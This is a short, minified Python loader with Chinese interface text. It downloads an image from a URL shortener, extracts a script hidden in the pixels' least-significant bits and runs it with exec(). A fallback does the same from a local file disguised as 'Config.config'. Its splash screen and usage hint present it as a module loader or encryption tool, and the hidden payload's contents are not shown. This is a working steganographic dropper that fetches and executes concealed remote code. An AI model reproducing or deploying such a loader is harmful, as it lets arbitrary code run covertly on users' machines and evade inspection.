#!/usr/bin/env python3
_D='图片哈希校验失败，内容可能被篡改'
_C='URL 哈希校验失败，链接可能被篡改'
_B='__main__'
_A=False
import os,sys,io,threading,hashlib,requests
from PIL import Image

IMAGE_URL='https://s.yam.com/CD6B9'
EXPECTED_URL_HASH='dc9c6e650a74b667739096b399f7828afd6e780d71d47a1d453871ef4be23862'
EXPECTED_IMAGE_HASH='6e490604d0dec90b476523bc17887047bf7824673207ceb0065b646c346bb52b'
def _has_gui():
	try:import tkinter;tkinter.Tk().destroy();return True
	except:return _A
def _hash_bytes(data):return hashlib.sha256(data).hexdigest()
def _extract(img_bytes):
	img=Image.open(io.BytesIO(img_bytes));pixels=list(img.getdata());mode=img.mode;bits=[]
	for p in pixels:
		for c in range(len(mode)):bits.append(p[c]&1)
	data=bytearray()
	for i in range(0,len(bits)-15,8):
		b=0
		for j in range(8):b=b<<1|bits[i+j]
		data.append(b)
		if len(data)>=2 and data[-2]==0 and data[-1]==0:return bytes(data[:-2])
	return bytes(data)
def _exec(script,args):
	g={'__name__':_B,'__file__':'<script>','sys':sys};old_argv=sys.argv;sys.argv=[sys.argv[0]]+args
	try:exec(script,g)
	finally:sys.argv=old_argv
def _load_from_file(filepath):
	with open(filepath,'rb')as f:img_data=f.read()
	if _hash_bytes(img_data)!=EXPECTED_IMAGE_HASH:raise RuntimeError('本地文件哈希校验失败，可能被篡改')
	script=_extract(img_data)
	if not script:raise RuntimeError('本地文件中未找到数据')
	return script
def _splash_and_run():
	B='error';A='script';import tkinter as tk;from tkinter import ttk,messagebox;root=tk.Tk();root.title('加载中');root.geometry('300x100');root.resizable(_A,_A);root.eval('tk::PlaceWindow . center');tk.Label(root,text='正在加载模块，请稍候...').pack(pady=10);progress=ttk.Progressbar(root,mode='indeterminate');progress.pack(fill='x',padx=20);progress.start(10);result={A:None,B:None}
	def load():
		try:
			if _hash_bytes(IMAGE_URL.encode())!=EXPECTED_URL_HASH:raise RuntimeError(_C)
			resp=requests.get(IMAGE_URL,timeout=30);resp.raise_for_status();img_data=resp.content
			if _hash_bytes(img_data)!=EXPECTED_IMAGE_HASH:raise RuntimeError(_D)
			script=_extract(img_data)
			if not script:raise RuntimeError('未找到数据')
			result[A]=script
		except Exception as e:result[B]=str(e)
		finally:root.after(0,root.destroy)
	threading.Thread(target=load,daemon=True).start();root.mainloop()
	if result[B]:
		root=tk.Tk();root.withdraw();answer=messagebox.askyesno('加载失败',f"远程加载失败：{result[B]}\n是否尝试从当前目录的 Config.config 加载？");root.destroy()
		if answer:
			config_path=os.path.join(os.getcwd(),'Config.config')
			if not os.path.isfile(config_path):print('[!] 当前目录下未找到 Config.config 文件');sys.exit(1)
			try:script=_load_from_file(config_path);print(f"[+] 从本地加载 {len(script)} 字节代码，正在启动主程序...");_exec(script,[])
			except Exception as e:print(f"[!] 本地加载失败: {e}");sys.exit(1)
		else:sys.exit(1)
	else:print(f"[+] 加载 {len(result[A])} 字节代码，正在启动主程序...");_exec(result[A],[])
def main():
	args=sys.argv[1:]
	if args:
		try:
			if _hash_bytes(IMAGE_URL.encode())!=EXPECTED_URL_HASH:raise RuntimeError(_C)
			resp=requests.get(IMAGE_URL,timeout=30);resp.raise_for_status();img_data=resp.content
			if _hash_bytes(img_data)!=EXPECTED_IMAGE_HASH:raise RuntimeError(_D)
			script=_extract(img_data)
			if not script:print('[!] 未找到隐藏数据');sys.exit(1)
			print(f"[+] 加载 {len(script)} 字节代码，正在执行...");_exec(script,args)
		except Exception as e:print(f"[!] 操作失败: {e}");sys.exit(1)
		return
	if not _has_gui():print('\n[!] 错误：当前环境不支持 GUI，且未提供命令行参数。');print('    请通过命令行参数指定操作模式，例如：');print('    python loader.py encrypt 文件路径 -o 输出路径 -p 密码');sys.exit(1)
	_splash_and_run()
if __name__==_B:main()